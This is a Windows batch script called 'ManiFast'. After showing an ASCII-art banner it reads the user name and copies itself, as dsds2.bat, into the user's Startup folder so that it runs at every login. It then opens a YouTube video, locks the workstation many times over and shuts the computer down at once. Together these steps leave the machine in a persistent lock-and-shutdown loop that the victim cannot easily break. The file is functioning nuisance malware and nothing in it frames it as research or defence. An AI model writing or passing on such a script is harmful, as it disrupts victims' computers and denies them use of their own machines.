@echo off

color 05

::start /max
title --==::ManiFast::==--
color 04

echo ---------------------------------------------------------------------------------------------------
echo        _____                _           _    _              __  __             _ ______        _   
echo       / ____l              l l         l l  l l            l  \/  l           (_)  ____l      l l  
echo      l l     _ __ ___  __ _l l_ ___  __l l  l l__  _   _   l \  / l __ _ _ __  _l l__ __ _ ___l l_ 
echo      l l    l '__/ _ \/ _` l __/ _ \/ _` l  l '_ \l l l l  l l\/l l/ _` l '_ \l l  __/ _` / __l __l
echo      l l____l l l  __/ (_l l ll  __/ (_l l  l l_) l l_l l  l l  l l (_l l l l l l l l (_l \__ \ l_ 
echo       \_____l_l  \___l\__,_l\__\___l\__,_l  l_.__/ \__, l  l_l  l_l\__,_l_l l_l_l_l  \__,_l___/\__l
echo                                                     __/ l                                          
echo                                                    l___/                                           
echo ---------------------------------------------------------------------------------------------------

echo Loading...
timeout 1
color 03

net user
echo Loading...
echo User of this PC is:
set name=%UserName%
echo You are %name%

:::: Copying this file to path Startup wherever it was (in two folders: Desktop, Documents of Downloads)
:: For "Desktop"
cd C:\Users\%name%\OneDrive\Desktop
cd C:\Users\%name%\OneDrive\Рабочий стол

xcopy "dsds2.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
cd %AppData%\Microsoft\Windows\Start Menu\Programs\Startup
rem dir /B
@echo.

:: For "Downloads"
cd C:\Users\%name%\Downloads
xcopy "dsds2.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
dir /B

:: For "Documents"



echo -------------------------------------------------------------------------------

:UP

start chrome https://www.youtube.com/watch?v=jMBsK5BxTaw
timeout 4
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"


Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1
Rundll32.exe user32.dll,LockWorkStation
"%appdata%\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk"
timeout 1

timeout 3
:: Re
shutdown /t 0
GOTO UP

pause
exit
